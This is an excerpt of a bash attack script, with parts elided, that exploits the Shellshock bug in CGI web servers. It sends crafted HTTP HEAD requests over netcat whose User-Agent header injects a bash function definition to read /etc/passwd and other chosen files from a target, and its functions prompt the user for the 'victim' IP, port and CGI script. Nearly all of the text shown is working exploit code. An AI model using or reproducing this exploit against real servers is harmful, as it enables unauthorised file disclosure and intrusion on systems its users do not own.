...
rport=80 # remote port to make the connetcion to, default 80
file2test=/etc/passwd
...
function getStats {
        ...
        response="$(echo -e "HEAD /cgi-bin/$script HTTP/1.1\r\nUser-Agent: () { :;}; echo \$(</etc/passwd_FOOB_BAR_BAZ_BAR_BAZ_FOO)\r\nHost: $ip\r\nConnection: close\r\n\r\n" | nc $ip $rport)" # it's probably safe to say that that file should not exist. anywhere. ever.
        err=$(echo $response|wc -c);
        printf "[$GREEN!$NC]$GREEN Stats Gathering completed with length of $err bytes$NC\n";
}
function getPasswd { # initial test for /etc/passwd: (not part of getFile() for that reason)
        printf "[$WHITE+$NC]$WHITE Trying $ip for $file2test ...$NC\n"
        response="$(echo -e "HEAD /cgi-bin/$script HTTP/1.1\r\nUser-Agent: () { :;}; echo \$(<$file2test)\r\nHost: $ip\r\nConnection: close\r\n\r\n" | nc $ip $rport)"
...
function getIP { # get the IP address of the victim
        ...
        printf "$NC";
        if [ "$ans" = "y" ]; then
                getPort # now, we get the port # to connect to.
        else
                getIP # They had a typo
        fi
}

function getPort { # get the web server port
        printf "[?] What is the target port? $YELLOW"
        read rport;
        printf "$NC[?] Is$YELLOW $rport$NC correct [y/n]? $YELLOW"
        read ans
        printf "$NC";
        if [ "$ans" = "y" ]; then
                getScript
        else
                getPort # They had a typo
        fi
